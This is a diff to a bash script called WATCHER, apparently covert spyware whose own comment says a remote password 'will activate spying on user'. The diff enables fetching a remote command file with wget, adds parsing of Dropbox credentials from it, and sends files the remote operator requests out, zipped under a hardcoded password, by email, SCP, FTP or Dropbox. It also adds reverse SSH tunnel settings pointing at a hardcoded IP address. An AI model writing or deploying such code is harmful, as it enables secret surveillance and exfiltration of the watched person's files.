@@ -65,15 +65,23 @@ function clean_dir {
 
 function remote_config {
 	ACTIVATE=0
-	MD5OLD="none"
-	[ -f "$REMOTE_CONFIG_NAME.old" ] && MD5OLD=`md5sum "$REMOTE_CONFIG_NAME.old" | cut -d " " -f 1`
+	[ ! -f "$REMOTE_CONFIG_NAME.old" ] && touch "$REMOTE_CONFIG_NAME.old"
 	# following cp command is for testing purposes only; delete it and uncomment wget command!
-	cp WATCHER-hard.cfg WATCHER.cfg
-	#! `wget -q --no-cache "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"` && return 1
-	MD5NEW=`md5sum "$REMOTE_CONFIG_NAME" | cut -d " " -f 1`
-	echo "$MD5OLD $MD5NEW"
-	if [[ "$MD5NEW" != "$MD5OLD" ]]
+	#cp WATCHER-hard.cfg WATCHER.cfg
+	`wget -q --no-cache "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"`
+	if [ $? -eq 1 ]
 	then
+		while read line_conf; do
+		line_conf1=`echo $line_conf | cut -d : -f 1`
+		line_conf2=`echo $line_conf | cut -d : -f 2`
+		[ "$line_conf1" == "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1 && echo "Pass OK"
+		[ "$line_conf1" == "db_user" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_USER=$line_conf2
+		[ "$line_conf1" == "db_pass" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_PASS=$line_conf2
+		[ "$line_conf1" == "db_commit" ] && [ $ACTIVATE -eq 1 ] && [ $DB_EXT_USER != "" ] && [ $DB_EXT_PASS != "" ] && DB_EXT_ACTIVE=1
+		# post other options here
+		# activate diiferent upload options
+		done < "$REMOTE_CONFIG_NAME.old"
+	else
 		while read line_conf; do
 		line_conf1=`echo $line_conf | cut -d : -f 1`
 		line_conf2=`echo $line_conf | cut -d : -f 2`
@@ -83,13 +91,14 @@ function remote_config {
 		[ "$line_conf1" == "dirdata" ] && [ $ACTIVATE -eq 1 ] && echo "Dir data"
 		[ "$line_conf1" == "downloadfile" ] && [ $ACTIVATE -eq 1 ] && remote_send_file "$line_conf2"
 		[ "$line_conf1" == "delfile" ] && [ $ACTIVATE -eq 1 ] && echo "Delete $line_conf2"
+		[ "$line_conf1" == "db_user" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_USER=$line_conf2
+		[ "$line_conf1" == "db_pass" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_PASS=$line_conf2
+		[ "$line_conf1" == "db_commit" ] && [ $ACTIVATE -eq 1 ] && [ $DB_EXT_USER != "" ] && [ $DB_EXT_PASS != "" ] && DB_EXT_ACTIVE=1
 		# post other options here
 		done < $REMOTE_CONFIG_NAME
 		mv "$REMOTE_CONFIG_NAME" "$REMOTE_CONFIG_NAME.old"
 	fi
 	rm "$REMOTE_CONFIG_NAME"
-	unset MD5OLD
-	unset MD5NEW
 }
 
 function file_list {
@@ -106,17 +115,21 @@ function remote_send_file {
 	FILE_NAME_sf="filerequest-$DATA-$RANDOM"
 	if [ $FILESIZE -le $MAX_ATACHEMENT_SIZE ]
 	then
+		echo ""
 		zip -r "tmp/$FILE_NAME_sf.zip" -P 42p6b2V3hy7c92g42p6b2V3hy7c92g "$1"
-		[ $SMTP_CONNECTION -eq 1 ] && fsendemail "SendRequestedFile - $DATA" "Requested file" "$FILENAME"
+		[ $CONNECTION_SMTP -eq "1" ] && fsendemail "SendRequestedFile - $DATA" "Requested file" "$FILENAME"
 		[ -f "$1" ] && [ $R_SCP -eq 1 ] && run_scp "tmp/$FILE_NAME_sf.zip"
 		[ -f "$1" ] && [ $R_FTP -eq 1 ] && run_ftp "tmp/$FILE_NAME_sf.zip"
-		[ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "tmp/$FILE_NAME_sf.zip"
+		#[ $R_DB_ext -eq 1 ] && [ -f "$1" ] && [ $DB_EXT_ACTIVE -eq 1 ] && run_dropbox_ext "tmp/$FILE_NAME_sf.zip" 1
+		[ $? -eq 1 ] && [ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "tmp/$FILE_NAME_sf.zip"
 		[ -f "tmp/$FILE_NAME_sf.zip" ] && mv "tmp/$FILE_NAME_sf.zip" tosendlater/
 	else
+		echo ""
 		# What to do, when file is greater than max attachement size.
 		[ $R_SCP -eq 1 ] && [ -f "$1" ] && run_scp "$1"
 		[ $R_FTP -eq 1 ] && [ -f "$1" ] && run_ftp "$1"
-		[ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "$1"
+		#[ $R_DB_ext -eq 1 ] && [ -f "$1" ] && [ $DB_EXT_ACTIVE -eq 1 ] && run_dropbox_ext "$1" 0
+		[ $? -eq 1 ] && [ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "$1"
 	fi
 	unset FILESIZE
 	unset FILE_NAME_sf
@@ -182,6 +195,7 @@ SMTP_COUNTER=0
 CAM_COUNTER=0
 ACTIVATE=0
 REMOTE_COUNTER=0
+DB_EXT_ACTIVE=0
 
 # Becomes "1", when the first picture was made
 CAM_FIRST=0
@@ -190,9 +204,11 @@ CAM_FIRST=0
 MAX_ATACHEMENT_SIZE=5000
 
 # What additional modules should be loaded: 0-dont, 1-run
-R_DB=0 # Dropbox
+R_DB=1 # Dropbox
+R_DB_ext=0 # Dropbox-ext module
 R_SCP=0 # SCP
 R_FTP=0 # FTP
+R_SSH_REV=0
 
 # Dropbox directory, from script point of view
 DB_DIR="../Dropbox/.config"
@@ -200,8 +216,12 @@ DB_DIR=`readlink --canonicalize "$DB_DIR"`
 # Another DB DIR which is used to upload files requested by you via remote_manager, when they are bigger than Max_Attachement_Size
 DB_DIR2="../Dropbox/.config-other"
 DB_DIR2=`readlink --canonicalize "$DB_DIR2"`
+DB_EXT_DIR=".config-ext"
 mkdir $DB_DIR
 mkdir $DB_DIR2
+DB_EXT_USER=""
+DB_EXT_PASS=""
+
 
 # When we should start remove random files from tosendlater dir
 DIR_WARNING_SIZE=20000 # 20mb
@@ -220,6 +240,16 @@ REMOTE_CONFIG_NAME="WATCHER.cfg" # File name
 REMOTE_ACTIVATION_PASS="PASS" # Password (it should be placed at the top of config file), it will activate spying on user if you decoded so
 REMOTE_CHECK_EVERY=10 # check every 10 passes, for special commands
 REMOTE_WAIT_TO_NEXT_CHECK=1800 # If the script is running
+
+# Setup reverse ssh tunnel
+SSH_REV_ACTIVE=0
+SSH_REV_PORT1=10002
+SSH_REV_PORT2=22
+SSH_REV_PORT3=567
+SSH_REV_LOC="localhost"
+SSH_REV_USER="user"
+SSH_REV_REMOTE="212.145.33.4"
+SSH_REV_FINAL="$SSH_REV_PORT1:$SSH_REV_LOCAL:$SSH_REV_PORT2 $SSH_REV_USER:$SSH_REV_FINAL -p $SSH_REV_PORT3"
 
 
 ################
@@ -256,7 +286,6 @@ check_smtp
 while true
 do
 	start_time=$(date +%s)
-
 
 	################
 	# Rules: connecition
@@ -295,12 +324,13 @@ do
 
 
 	################
-	# Remote counter
+	# Remote module
 	########
 	REMOTE_COUNTER=$(($REMOTE_COUNTER+1))
 	[ $CONNECTION_MODE -eq "1" ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0 && remote_config;
 	[ $ACTIVATE -eq 0 ] && [ $REMOTE_CONFIG -eq 3 ] && sleep $REMOTE_WAIT_TO_NEXT_CHECK && continue;
 	[ $ACTIVATE -eq 0 ] && [ $CONNECTION_MODE -eq "1" ] && [ $REMOTE_CONFIG -eq 1 ] && exit 0;
+	[ $CONNECTION_MODE -eq "0" ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && DB_EXT_ACTIVE=0
 	[ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0
 
 
